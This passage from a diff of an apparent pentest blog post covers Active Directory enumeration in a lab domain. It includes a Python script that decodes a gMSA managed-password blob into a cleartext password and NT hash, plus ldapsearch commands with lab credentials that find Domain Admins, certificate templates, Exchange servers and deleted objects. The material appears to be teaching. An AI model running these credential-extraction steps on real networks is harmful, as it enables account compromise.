+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gmsa.py -b &amp;lt;msDS-ManagedPassword base64&amp;gt; -v (optional verbose)&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; opt, arg &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; opts:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; opt &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-h&amp;#39;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gmsa.py -b &amp;lt;msDS-ManagedPassword base64&amp;gt; -v (optional verbose)&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; opt &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-v&amp;#34;&lt;/span&gt;):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            verbose &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; opt &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-b&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;--base64&amp;#34;&lt;/span&gt;):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            b64 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; arg
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; b64 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gmsa.py -b &amp;lt;msDS-ManagedPassword base64&amp;gt; -v (optional verbose)&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(b64)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    blob &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MSDS_MANAGEDPASSWORD_BLOB()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    blob&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fromString(test)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; verbose &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        blob&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dump()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Cleartext Password&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        hexdump(blob[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CurrentPassword&amp;#39;&lt;/span&gt;][:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Cryptodome.Hash &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; MD4
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    hash &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MD4&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new ()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    hash&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;update (blob[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CurrentPassword&amp;#39;&lt;/span&gt;][:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NTHash: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(hash&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexdigest()))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   main(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:])
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ python3 ./gmsa.py -b AQAAACQCAAAQABIBFAIcAq/tlcA3PziSdtjxwKwcpM9VAteZa9No6et8yDWzgEYj5yFDhzT0OMFtTA4qAI4M+sWjiUVqYhDwFItW+5FlhaJp8tm/fcAfIDc5MAsYOXgq3AIc6ofCpeJga6Jw4SX/EKmnQdsS7lGmXd/yh27qJGj6SS0vwk//D8cr1+6s43YB0TxUxyLrruupZmd4Ndx2PZ4L4zkWa/vlRlDzadyeGwji70q9sfjH5x7+l7V+w5JK7/hKfG48swD8koEK/bHyLxZa8eDMEoscAmnuC/CA/pTvdF6jfIYmAYMGZujOVkbXJjaCEPGA1+nBDqkOQ1NlLZu4Y6Es1bB3YVIv6agDICYAAJ3USvAd5t267x9PfdetWSfLGRt4qxMCmOwXO0nVWMJTSYfjC+Phc0QX/rrTimPptYvx2NnuAclbgj0Fvg0iZfOvHW0SwdKTyKCvGeL+UPz4Jwr2VAd+PX43GoUPD8uBhDrtzVSwUhtScDIvzGJYgvHrREnTUqaf9pENqkVpbdXHtpE/buIphVrPEg84e9fgNB2a/r6sZaPX+1C8e/5pbNO7qoQ4fqXSDPM3qh6ymlh2ouNRoP0kN4sLVUvW+cNX+YQk7UJDSnG3fANPtgquhi6B4OVqU2fpypUbFtd91Ju/9xZeuod508FqYHPT1aX86tBdLj4yq2/65ROupERLVhAAADPE7gxzEgAAM2YeWnISAAA&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;================================================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NTHash: 78450c9611e6c9515e2a489f9b31cc3e
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;================================================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If you want to learn more about GMSAs and a newer attack called the &amp;ldquo;Golden GMSA&amp;rdquo; check out the Sempris blog here: &lt;a href=&#34;https://www.semperis.com/blog/golden-gmsa-attack/&#34;&gt;https://www.semperis.com/blog/golden-gmsa-attack/&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;certificate-authorities-and-templates&#34;&gt;Certificate Authorities and Templates&lt;/h3&gt;
+&lt;p&gt;This is a list of certificate templates that are enabled on each certificate authority in the domain.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -LLL -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=sittingduck,DC=info&amp;#34;&lt;/span&gt; -h 192.168.80.10 -w &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ASDqwe123&amp;#34;&lt;/span&gt; -D &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;uberuser&amp;#34;&lt;/span&gt;  certificateTemplates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Enrollment Services,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Public Key Services,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Services,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configuration
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck-W2KCA-CA,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Enrollment Services,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Public Key Services,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;S
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ervices,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: ExchangeUser
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: ExchangeUserSignature
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: EnrollmentAgentOffline
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: MachineEnrollmentAgent
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: EnrollmentAgent
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: CrossCA
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: CodeSigning
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: CEPEncryption
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: CAExchange
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: ClientAuth
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: Workstation
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: UserSignature
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: CTLSigning
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: SmartcardUser
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: SmartcardLogon
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: OfflineRouter
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: RASAndIASServer
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: OCSPResponseSigning
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: KeyRecoveryAgent
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: IPSECIntermediateOffline
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: IPSECIntermediateOnline
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: DirectoryEmailReplication
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: DomainControllerAuthentication
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: KerberosAuthentication
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: EFSRecovery
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: EFS
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: DomainController
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: WebServer
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: Machine
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: User
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: SubCA
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: Administrator
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;nested-group-membership&#34;&gt;Nested Group Membership&lt;/h3&gt;
+&lt;p&gt;A query like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -x -LLL -h dc1.sittingduck.info -w ASDqwe123 -D uberuser -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dc=sittingduck,dc=info&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;(memberOf=cn=Domain Admins,cn=Users,dc=SittingDuck,dc=info)&amp;#39;&lt;/span&gt; cn
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;will result in all of the accounts that have a &lt;code&gt;memberOf&lt;/code&gt; attribute of Domain Admins. This will show you the first level of membership, but LDAP/AD actually has a way to identify nested membership using the &lt;a href=&#34;https://ldapwiki.com/wiki/1.2.840.113556.1.4.1941&#34;&gt;1.2.840.113556.1.4.1941&lt;/a&gt; &lt;a href=&#34;https://ldapwiki.com/wiki/OID&#34;&gt;OID&lt;/a&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -x -LLL -h dc1.sittingduck.info -w ASDqwe123 -D uberuser -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dc=sittingduck,dc=info&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;(memberOf:1.2.840.113556.1.4.1941:=cn=Domain Admins,cn=Users,dc=sittingduck,dc=info)&amp;#39;&lt;/span&gt; cn
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This will show you all Domain Admins even if they are in a group in a group in a group in a group.&lt;/p&gt;
+&lt;h3 id=&#34;find-exchange-servers&#34;&gt;Find Exchange Servers&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -LLL -h 192.168.80.10 -o ldif-wrap&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no -x -D uberuser -w ASDqwe123 -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cn=Configuration,dc=sittingduck,dc=info&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(objectCategory=msExchExchangeServer)&amp;#34;&lt;/span&gt; dn
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;SDEXCHANGE,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Servers,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Exchange Administrative Group &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;FYDIBOHF23SPDLT&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Administrative Groups,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;First Organization,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Microsoft Exchange,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Services,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;deleted--tombstoned-objects&#34;&gt;Deleted / Tombstoned objects&lt;/h3&gt;
+&lt;p&gt;Looking at deleted and tombstoned objects won&amp;rsquo;t always get you much information you can directly use, but sometimes there are passwords or other sensitive data stored in objects. (I don&amp;rsquo;t believe deleting objects changes their permissions but I could be wrong here)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -h 192.168.80.10 -x -w ASDqwe123 -D uberuser -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CN=Deleted Objects,DC=sittingduck,DC=info&amp;#34;&lt;/span&gt; -E &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;!1.2.840.113556.1.4.417&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For example here is a Computer account that was deleted:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# blah1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DEL:2f7b19b1-9dee-4a48-8bb0-ad62e6a287ef, Deleted Objects, sittingduck.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;blah1&lt;span style=&#34;color:#ae81ff&#34;&gt;\0&lt;/span&gt;ADEL:2f7b19b1-9dee-4a48-8bb0-ad62e6a287ef,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Deleted Objects,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;objectClass: top
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;objectClass: person
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;objectClass: organizationalPerson
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;objectClass: user
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;objectClass: computer
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cn:: YmxhaDEKREVMOjJmN2IxOWIxLTlkZWUtNGE0OC04YmIwLWFkNjJlNmEyODdlZg&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;distinguishedName: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;blah1&lt;span style=&#34;color:#ae81ff&#34;&gt;\0&lt;/span&gt;ADEL:2f7b19b1-9dee-4a48-8bb0-ad62e6a287ef,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Dele
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ted Objects,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;instanceType: &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;whenCreated: 20220512041425.0Z
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;whenChanged: 20220512045921.0Z
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;uSNCreated: &lt;span style=&#34;color:#ae81ff&#34;&gt;2663983&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;isDeleted: TRUE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;uSNChanged: &lt;span style=&#34;color:#ae81ff&#34;&gt;2664044&lt;/span&gt;
